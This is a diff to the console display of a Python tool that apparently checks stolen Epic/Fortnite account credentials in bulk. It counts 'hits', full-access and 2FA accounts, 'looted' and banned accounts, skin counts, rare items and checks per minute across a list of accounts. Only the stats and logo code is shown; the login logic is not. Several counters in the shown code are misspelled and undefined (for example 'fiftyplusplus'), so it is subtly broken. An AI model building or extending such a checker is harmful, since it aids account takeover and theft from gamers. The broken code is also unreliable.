-                print(f" {Fore.WHITE}├── [{Counter.epic2fa}] {Fore.YELLOW}2FA")
-                print(f" {Fore.WHITE}├── [{Counter.xb}] {Fore.YELLOW}Xbox")
-                print(f" {Fore.WHITE}└── [{Counter.fnban}] {Fore.YELLOW}Banned")
-                print(f"{Fore.WHITE}[{total_hits}] {Fore.GREEN}Hit")
-                category_list = list(tree.items())  
-                last_category_idx = len(category_list) - 1
-                for idx, (category, counts) in enumerate(category_list):
-                    fa_count = counts['FA']
-                    nfa_count = counts['NFA']
-                    total_count = fa_count + nfa_count
+                        is_last_category = idx == last_category_idx
+                        if is_last_category:
+                            print(f"{Fore.WHITE} └── [{total_count}] {Fore.CYAN}{category}")
+                        else:
+                            print(f"{Fore.WHITE} ├── [{total_count}] {Fore.CYAN}{category}")
 
-                    is_last_category = idx == last_category_idx
-                    if is_last_category:
-                        print(f"{Fore.WHITE} └── [{total_count}] {Fore.CYAN}{category}")
-                    else:
-                        print(f"{Fore.WHITE} ├── [{total_count}] {Fore.CYAN}{category}")
+                        fa_vertical = Fore.WHITE + " │" if not is_last_category else Fore.WHITE + "  "
+                        nfa_vertical = Fore.WHITE + "  " if fa_count > 0 and is_last_category else fa_vertical
 
-                    fa_vertical = Fore.WHITE + " │" if not is_last_category else Fore.WHITE + "  "
-                    nfa_vertical = Fore.WHITE + "  " if fa_count > 0 and is_last_category else fa_vertical
+                        if fa_count > 0:
+                            print(f"{fa_vertical}    {Fore.WHITE}└── {Fore.WHITE}[{fa_count}] {Fore.GREEN}FA")
 
-                    if fa_count > 0:
-                        print(f"{fa_vertical}    {Fore.WHITE}└── {Fore.WHITE}[{fa_count}] {Fore.GREEN}FA")
+                        if nfa_count > 0:
+                            print(f"{nfa_vertical}    {Fore.WHITE}└── {Fore.WHITE}[{nfa_count}] {Fore.GREEN}NFA")
+                elif self.cuitype == 'nexus':
+                    logo_colored = [
+                                            f"                  {Fore.RED}██████{Fore.LIGHTRED_EX}╗{Fore.RED}  ██████{Fore.LIGHTRED_EX}╗{Fore.RED} ██{Fore.LIGHTRED_EX}╗{Fore.RED}  ████████{Fore.LIGHTRED_EX}╗{Fore.RED} ██████{Fore.LIGHTRED_EX}╗{Fore.RED}██{Fore.LIGHTRED_EX}╗{Fore.RED}  ██{Fore.LIGHTRED_EX}╗{Fore.RED}███████{Fore.LIGHTRED_EX}╗{Fore.RED} ██████{Fore.LIGHTRED_EX}╗{Fore.RED}██{Fore.LIGHTRED_EX}╗{Fore.RED}  ██{Fore.LIGHTRED_EX}╗{Fore.RED}███████{Fore.LIGHTRED_EX}╗{Fore.RED}██████{Fore.LIGHTRED_EX}╗",
+                                            f"                  {Fore.RED}██{Fore.LIGHTRED_EX}╔══{Fore.RED}██{Fore.LIGHTRED_EX}╗{Fore.RED}██{Fore.LIGHTRED_EX}╔═══{Fore.RED}██{Fore.LIGHTRED_EX}╗{Fore.RED}██{Fore.LIGHTRED_EX}║  ╚══{Fore.RED}██{Fore.LIGHTRED_EX}╔══╝{Fore.RED}██{Fore.LIGHTRED_EX}╔════╝{Fore.RED}██{Fore.LIGHTRED_EX}║{Fore.RED}  ██{Fore.LIGHTRED_EX}║{Fore.RED}██{Fore.LIGHTRED_EX}╔════╝{Fore.RED}██{Fore.LIGHTRED_EX}╔════╝{Fore.RED}██{Fore.LIGHTRED_EX}║{Fore.RED} ██{Fore.LIGHTRED_EX}╔╝{Fore.RED}██{Fore.LIGHTRED_EX}╔════╝{Fore.RED}██{Fore.LIGHTRED_EX}╔══{Fore.RED}██{Fore.LIGHTRED_EX}╗",
+                                            f"                  {Fore.RED}██████{Fore.LIGHTRED_EX}╔╝{Fore.RED}██{Fore.LIGHTRED_EX}║{Fore.RED}   ██{Fore.LIGHTRED_EX}║{Fore.RED}██{Fore.LIGHTRED_EX}║    {Fore.RED} ██{Fore.LIGHTRED_EX}║  {Fore.RED} ██{Fore.LIGHTRED_EX}║{Fore.RED}     ███████{Fore.LIGHTRED_EX}║{Fore.RED}█████{Fore.LIGHTRED_EX}╗{Fore.RED}  ██{Fore.LIGHTRED_EX}║    {Fore.RED} █████{Fore.LIGHTRED_EX}╔╝{Fore.RED} █████{Fore.LIGHTRED_EX}╗  {Fore.RED}██████{Fore.LIGHTRED_EX}╔╝",
+                                            f"                  {Fore.LIGHTRED_EX}██{Fore.RED}╔══{Fore.LIGHTRED_EX}██{Fore.RED}╗{Fore.LIGHTRED_EX}██{Fore.RED}║  {Fore.LIGHTRED_EX} ██{Fore.RED}║{Fore.LIGHTRED_EX}██{Fore.RED}║    {Fore.LIGHTRED_EX} ██{Fore.RED}║   {Fore.LIGHTRED_EX}██{Fore.RED}║{Fore.LIGHTRED_EX}     ██{Fore.RED}╔══{Fore.LIGHTRED_EX}██{Fore.RED}║{Fore.LIGHTRED_EX}██{Fore.RED}╔══╝  {Fore.LIGHTRED_EX}██{Fore.RED}║     {Fore.LIGHTRED_EX}██{Fore.RED}╔═{Fore.LIGHTRED_EX}██{Fore.RED}╗{Fore.LIGHTRED_EX} ██{Fore.RED}╔══╝ {Fore.LIGHTRED_EX} ██{Fore.RED}╔══{Fore.LIGHTRED_EX}██{Fore.RED}╗",
+                                            f"                  {Fore.LIGHTRED_EX}██████{Fore.RED}╔╝╚{Fore.LIGHTRED_EX}██████{Fore.RED}╔╝{Fore.LIGHTRED_EX}███████{Fore.RED}╗{Fore.LIGHTRED_EX}██{Fore.RED}║   ╚{Fore.LIGHTRED_EX}██████{Fore.RED}╗{Fore.LIGHTRED_EX}██{Fore.RED}║  {Fore.LIGHTRED_EX}██{Fore.RED}║{Fore.LIGHTRED_EX}███████{Fore.RED}╗╚{Fore.LIGHTRED_EX}██████{Fore.RED}╗{Fore.LIGHTRED_EX}██{Fore.RED}║ {Fore.LIGHTRED_EX} ██{Fore.RED}╗{Fore.LIGHTRED_EX}███████{Fore.RED}╗{Fore.LIGHTRED_EX}██{Fore.RED}║  {Fore.LIGHTRED_EX}██{Fore.RED}║",
+                                            f"                  {Fore.RED}╚═════╝  ╚═════╝ ╚══════╝╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝",
+                    ]
+                    total_chars = sum(line.count('█') + line.count('╔') + line.count('╗') + line.count('╚') + line.count('═') + line.count('║') for line in logo_colored)
+                    chars_to_color = total_chars if Counter.checkedpercent >= 100 else int(round(total_chars * Counter.checkedpercent / 100))
 
-                    if nfa_count > 0:
-                        print(f"{nfa_vertical}    {Fore.WHITE}└── {Fore.WHITE}[{nfa_count}] {Fore.GREEN}NFA")
+                    colored_logo = ""
+                    colored_count = 0
+
+                    for line in logo_colored:
+                                            colored_line = ""
+                                            for char in line:
+                                                if char in '█╔╗═║╚' and colored_count < chars_to_color:
+                                                    colored_line += char  
+                                                    colored_count += 1
+                                                else:
+                                                    if char in '█╔╗═║╚':
+                                                        colored_line += Fore.LIGHTWHITE_EX + char + colorama.Style.RESET_ALL
+                                                    else:
+                                                        colored_line += char 
+                                            colored_logo += colored_line + "\n"
+                    system('cls')
+                    print(colored_logo)
+                    zeroskins = 0
+                    oneplus = 0
+                    tenplus = 0
+                    fiftyplus = 0
+                    onehundredplus = 0
+                    twohundredplus = 0
+                    threehundredplus = 0
+                    exclusivee = 0
+                    maybefa = 0
+                    for data in Counter.skins_data:
+                        fullAccess = data["fullAccess"]
+                        total_skins = data["total_skins"]
+                        exclusive = data['exclusive']
+                        if fullAccess.lower() == 'fa':
+                            maybefa += 1
+                        if exclusive:
+                            exclusivee+=1
+                        elif 300 <= total_skins:
+                            threehundredplus+=1
+                        elif 200 <= total_skins <= 299:
+                            twohundredplushundredplus+=1
+                        elif 100 <= total_skins <= 199:
+                            onehundredplus+=1
+                        elif 50 <= total_skins <= 99:
+                            fiftyplusplus+=1
+                        elif 10 <= total_skins <= 49:
+                            tenplusplus+=1
+                        elif 1 <= total_skins <= 9:
+                            oneplus+=1
+                        elif total_skins == 0:
+                            zeroskins +=1
+                    def print_formatted(text, value1, value2, value3=None, color1=Fore.WHITE, color2=Fore.WHITE):
+                        if value3 is not None:
+                            print(f"{color1}{text.format(value1, value2, value3)}{color2}")
+                        else:
+                            print(f"{color1}{text.format(value1, value2)}{color2}")
+
+                    checked = int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked
+                    print_formatted("                                              [{1}]  Progress      [{0}/{2}]", checked, ">>", len(self.accounts), Fore.RED, Fore.WHITE)
+                    print()
+                    print_formatted("                                              [{1}]  Hits          [{0}]", Counter.hits, ">>", color1=Fore.GREEN)
+                    print_formatted("                                              [{1}]  2fa           [{0}]", Counter.custom, ">>", color1=Fore.LIGHTYELLOW_EX)
+                    print_formatted("                                              [{1}]  Epic 2fa      [{0}]", Counter.epic2fa, ">>", color1=Fore.YELLOW)
+                    print_formatted("                                              [{1}]  Maybe FA      [{0}]", maybefa, ">>", color1=Fore.LIGHTMAGENTA_EX)
+                    print_formatted("                                              [{1}]  Looted        [{0}]", Counter.locked, ">>", color1=Fore.LIGHTBLACK_EX)
+                    print_formatted("                                              [{1}]  Fails         [{0}]", Counter.bad, ">>", color1=Fore.LIGHTRED_EX)
+                    print()
+                    print_formatted("                                              [{1}]  300+ Skins    [{0}]", threehundredplus, ">>", color1=Fore.RED)
+                    print_formatted("                                              [{1}]  200+ Skins    [{0}]", twohundredplus, ">>", color1=Fore.RED)
+                    print_formatted("                                              [{1}]  100+ Skins    [{0}]", onehundredplus, ">>", color1=Fore.RED)
+                    print_formatted("                                              [{1}]  50+  Skins    [{0}]", fiftyplus, ">>", color1=Fore.RED)
+                    print_formatted("                                              [{1}]  10+  Skins    [{0}]", tenplus, ">>", color1=Fore.RED)
+                    print_formatted("                                              [{1}]  1+   Skins    [{0}]", oneplus, ">>", color1=Fore.RED)
+                    print_formatted("                                              [{1}]  0    Skins    [{0}]", zeroskins, ">>", color1=Fore.RED)
+
+                    print()
+                    print_formatted("                                              [{1}]  STW           [{0}]", Counter.stw, ">>", color1=Fore.YELLOW)
+                    print_formatted("                                              [{1}]  OGS           [{0}]", Counter.og, ">>", color1=Fore.MAGENTA)
+                    print_formatted("                                              [{1}]  Rares         [{0}]", exclusivee, ">>", color1=Fore.CYAN)
+                    print()
+                    print_formatted("                                              [{1}]  Retries       [{0}]", Counter.retries, ">>", color1=Fore.LIGHTYELLOW_EX)
+                    print_formatted("                                              [{1}]  CPM           [{0}]", Counter.cpm, ">>", color1=Fore.WHITE)
 
             except Exception as e:
                 print(f"{Fore.RED}{e}")
@@ -2641,6 +2809,7 @@ class Checker:
 
     try:
         printbadd = bool(config['checker']['print_fail'])
+        printms = bool(config['checker']['print_ms_hit'])
         retries = int(config['checker']['retries'])
         timeout = int(config['checker']['timeout']) / 1000
         threads = int(config['checker']['threads'])
